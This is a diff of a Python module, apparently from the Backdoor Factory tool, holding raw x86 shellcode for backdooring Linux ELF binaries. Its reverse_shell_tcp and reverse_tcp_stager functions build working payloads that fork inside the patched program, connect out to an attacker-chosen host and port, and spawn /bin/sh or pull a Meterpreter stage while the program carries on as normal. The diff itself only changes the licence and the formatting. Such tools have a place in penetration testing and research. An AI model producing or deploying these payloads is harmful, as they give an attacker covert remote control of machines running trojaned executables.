@@ -1,31 +1,39 @@
 '''
-    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-    
-    Copyright (C) 2013,2014, Joshua Pitts
 
-    License:   GPLv3
+Copyright (c) 2013-2014, Joshua Pitts
+All rights reserved.
 
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
+Redistribution and use in source and binary forms, with or without modification,
+are permitted provided that the following conditions are met:
 
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
+    1. Redistributions of source code must retain the above copyright notice,
+    this list of conditions and the following disclaimer.
 
-    See <http://www.gnu.org/licenses/> for a copy of the GNU General
-    Public License
+    2. Redistributions in binary form must reproduce the above copyright notice,
+    this list of conditions and the following disclaimer in the documentation
+    and/or other materials provided with the distribution.
 
-    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
-    This program is to be used for only legal activities by IT security
-    professionals and researchers. Author not responsible for malicious
-    uses.
+    3. Neither the name of the copyright holder nor the names of its contributors
+    may be used to endorse or promote products derived from this software without
+    specific prior written permission.
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+POSSIBILITY OF SUCH DAMAGE.
+
 '''
 
 import struct
 import sys
+
 
 class linux_elfI32_shellcode():
     """
@@ -39,9 +47,6 @@ class linux_elfI32_shellcode():
         self.e_entry = e_entry
         self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
         self.shellcode = ""
-        self.stackpreserve = "\x90\x90\x60\x9c"
-        self.stackrestore = "\x9d\x61"
-
 
     def pack_ip_addresses(self):
         hostocts = []
@@ -59,29 +64,28 @@ class linux_elfI32_shellcode():
 
     def reverse_shell_tcp(self, CavesPicked={}):
         """
-        Modified metasploit linux/x64/shell_reverse_tcp shellcode
+        Modified from metasploit payload/linux/x86/shell_reverse_tcp
         to correctly fork the shellcode payload and contiue normal execution.
         """
         if self.PORT is None:
             print ("Must provide port")
             sys.exit(1)
-       
-       
+
         self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
         #will need to put resume execution shellcode here
         self.shellcode1 += "\xbd"
         self.shellcode1 += struct.pack("<I", self.e_entry)
         self.shellcode1 += "\xff\xe5"
         self.shellcode1 += ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
-        "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68")
+                            "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68")
         #HOST
         self.shellcode1 += self.pack_ip_addresses()
         self.shellcode1 += "\x68\x02\x00"
         #PORT
         self.shellcode1 += struct.pack('!H', self.PORT)
         self.shellcode1 += ("\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
-        "\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
-        "\x52\x53\x89\xe1\xb0\x0b\xcd\x80")
+                            "\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
+                            "\x52\x53\x89\xe1\xb0\x0b\xcd\x80")
 
         self.shellcode = self.shellcode1
         return (self.shellcode1)
@@ -89,7 +93,7 @@ class linux_elfI32_shellcode():
     def reverse_tcp_stager(self, CavesPicked={}):
         """
         FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
-        Modified metasploit linux/x64/shell/reverse_tcp shellcode
+        Modified metasploit payload/linux/x64/shell/reverse_tcp
         to correctly fork the shellcode payload and contiue normal execution.
         """
         if self.PORT is None:
@@ -102,33 +106,31 @@ class linux_elfI32_shellcode():
         self.shellcode1 += struct.pack("<I", self.e_entry)
         self.shellcode1 += "\xff\xe5"
         self.shellcode1 += ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80"
-        "\x97\x5b\x68")
+                            "\x97\x5b\x68")
         #HOST
         self.shellcode1 += self.pack_ip_addresses()
         self.shellcode1 += "\x68\x02\x00"
         #PORT
         self.shellcode1 += struct.pack('!H', self.PORT)
         self.shellcode1 += ("\x89\xe1\x6a"
-                "\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10"
-                "\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b"
-                "\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1")
+                            "\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10"
+                            "\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b"
+                            "\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1")
 
         self.shellcode = self.shellcode1
         return (self.shellcode1)
 
     def user_supplied_shellcode(self, CavesPicked={}):
         """
-        For user with position independent shellcode from the user
+        For user supplied shellcode
         """
         if self.SUPPLIED_SHELLCODE is None:
             print "[!] User must provide shellcode for this module (-U)"
             sys.exit(0)
         else:
-            supplied_shellcode =  open(self.SUPPLIED_SHELLCODE, 'r+b').read()
-
+            supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
 
         self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
-        #will need to put resume execution shellcode here
         self.shellcode1 += "\xbd"
         self.shellcode1 += struct.pack("<I", self.e_entry)
         self.shellcode1 += "\xff\xe5"
